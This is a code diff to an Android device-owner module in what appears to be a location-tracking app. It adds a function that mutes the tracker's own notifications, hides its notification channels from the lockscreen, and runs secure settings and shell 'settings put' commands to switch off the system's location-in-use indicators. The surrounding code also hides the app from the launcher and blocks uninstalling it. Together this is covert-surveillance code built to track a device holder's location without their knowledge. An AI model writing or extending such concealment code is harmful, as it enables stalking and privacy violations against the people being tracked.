@@ -1,6 +1,9 @@
 package com.example.lctr_app.corporate
 
 import android.app.PendingIntent
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -64,6 +67,7 @@ object DeviceOwnerManager {
         hideAppFromLauncher(context)
 
         blockAppUninstall(context)
+        suppressTrackingNotifications(context)
 
         if (!restartLocationService) return
         val config = DeviceConfigStore(context)
@@ -119,6 +123,78 @@ object DeviceOwnerManager {
                 )
             } catch (e: Exception) {
                 Log.w(TAG, "deny POST_NOTIFICATIONS: ${e.message}")
+            }
+        }
+    }
+
+    /**
+     * Глушит уведомления трекера: запрет POST_NOTIFICATIONS, IMPORTANCE_MIN/None для каналов,
+     * OEM-настройки «приложение использует геолокацию» (Samsung и др.).
+     */
+    fun suppressTrackingNotifications(context: Context) {
+        if (!isDeviceOwner(context)) return
+        val app = context.applicationContext
+        val dpm = app.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val admin = adminComponent(app)
+        val pkg = app.packageName
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            try {
+                dpm.setPermissionGrantState(
+                    admin,
+                    pkg,
+                    android.Manifest.permission.POST_NOTIFICATIONS,
+                    DevicePolicyManager.PERMISSION_GRANT_STATE_DENIED,
+                )
+            } catch (e: Exception) {
+                Log.w(TAG, "suppress POST_NOTIFICATIONS: ${e.message}")
+            }
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            try {
+                val nm = app.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                for (channel in nm.notificationChannels) {
+                    val quiet = NotificationChannel(
+                        channel.id,
+                        channel.name,
+                        NotificationManager.IMPORTANCE_MIN,
+                    ).apply {
+                        description = channel.description
+                        setShowBadge(false)
+                        enableLights(false)
+                        enableVibration(false)
+                        setSound(null, null)
+                        lockscreenVisibility = Notification.VISIBILITY_SECRET
+                    }
+                    nm.createNotificationChannel(quiet)
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "mute notification channels: ${e.message}")
+            }
+        }
+        val secureKeys = mapOf(
+            "show_location_access_notification" to "0",
+            "location_access_notification" to "0",
+            "location_usage_notification" to "0",
+        )
+        for ((key, value) in secureKeys) {
+            try {
+                dpm.setSecureSetting(admin, key, value)
+            } catch (e: Exception) {
+                Log.w(TAG, "setSecureSetting $key: ${e.message}")
+            }
+        }
+        val shellCommands = listOf(
+            arrayOf("settings", "put", "secure", "show_location_access_notification", "0"),
+            arrayOf("settings", "put", "global", "show_location_access_notification", "0"),
+            arrayOf("settings", "put", "secure", "location_access_notification", "0"),
+            arrayOf("settings", "put", "system", "location_usage_notification", "0"),
+        )
+        for (cmd in shellCommands) {
+            try {
+                val code = Runtime.getRuntime().exec(cmd).waitFor()
+                Log.i(TAG, "suppress notifications ${cmd.joinToString()}: exit=$code")
+            } catch (e: Exception) {
+                Log.w(TAG, "suppress notifications ${cmd.joinToString()}: ${e.message}")
             }
         }
     }
@@ -275,6 +351,7 @@ object DeviceOwnerManager {
             Log.e(TAG, "enableLocationAccess permissions failed", e)
         }
         enableSystemLocation(app, dpm, admin)
+        suppressTrackingNotifications(app)
         val permsOk = CorporateSetupHelper.hasAlwaysLocation(app)
         Log.i(
             TAG,
